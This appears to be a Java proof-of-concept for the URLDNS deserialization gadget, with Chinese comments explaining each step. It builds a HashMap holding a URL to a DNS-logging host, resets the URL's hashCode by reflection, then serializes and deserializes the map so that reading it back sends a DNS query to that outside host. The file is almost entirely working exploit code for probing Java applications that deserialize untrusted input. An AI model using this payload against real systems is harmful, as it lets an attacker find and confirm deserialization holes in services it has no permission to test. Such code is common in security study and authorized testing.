package URLDNS;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        //0x01.生成payload
        //设置一个hashMap
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        //设置我们可以接受 DNS 查询的地址
        URL url = new URL("http://me83f5.ceye.io");
        //将URL的hashCode字段设置为允许修改
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        //**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**
        //1. 设置url的hashCode字段为0xdeadbeef（随意的值）
        f.set(url, 0xdeadbeef);
        //2. 将 url 放入 hashMap 中，右边参数随便写
        hashMap.put(url, "rmb122");
        //修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）
        f.set(url, -1);
        //0x02.写入文件模拟网络传输
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);
        //0x03.读取文件，进行反序列化触发payload
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        ois.readObject();
    }
}
